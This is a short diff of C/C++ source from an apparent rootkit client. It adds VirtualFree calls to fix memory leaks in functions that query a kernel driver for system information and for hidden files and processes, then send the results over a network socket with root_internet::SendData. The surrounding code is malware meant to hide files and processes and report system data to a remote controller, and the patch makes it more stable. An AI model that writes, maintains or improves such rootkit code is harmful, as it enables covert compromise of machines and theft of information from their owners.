@@ -397,10 +397,12 @@ int SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer
 		SysDataBuffer = RootkInst->Out;
 		result = root_internet::SendData(tosock, &TotalSize, sizeof(TotalSize), FALSE, 0);
 		if (result.err || result.value != sizeof(TotalSize)) {
+			VirtualFree(SysDataBuffer, 0, MEM_RELEASE);
 			return 0;
 		}
 
 		result = root_internet::SendData(tosock, SysDataBuffer, (int)TotalSize, FALSE, 0);
+		VirtualFree(SysDataBuffer, 0, MEM_RELEASE);
 		if (result.err || result.value != (int)TotalSize) {
 			return 0;
 		}
@@ -537,6 +539,7 @@ int HideFileKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNam
 	// Parse returned data correctly (after sending back main struct):
 	if ((DriverRes == 0 || DriverRes == 1) && RequestStatus == SHOWHIDDEN_FILEFOLDER && RootkInst->Size != 0) {
 		result = root_internet::SendData(tosock, RootkInst->Out, (int)RootkInst->Size, FALSE, 0);
+		VirtualFree(RootkInst->Out, 0, MEM_RELEASE);  // Release the allocated memory that was injected into by driver
 		if (result.err || result.value != RootkInst->Size) {
 			return 0;
 		}
@@ -592,6 +595,7 @@ int HideProcessKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* Module
 	// Parse returned data correctly (after sending back main struct):
 	if ((DriverRes == 0 || DriverRes == 1) && RequestStatus == SHOWHIDDEN_PROCESS && RootkInst->Size != 0) {
 		result = root_internet::SendData(tosock, RootkInst->Out, RootkInst->Size, FALSE, 0);
+		VirtualFree(RootkInst->Out, 0, MEM_RELEASE);  // Release the allocated memory that was injected into by driver
 		if (result.err || result.value != RootkInst->Size) {
 			return 0;
 		}
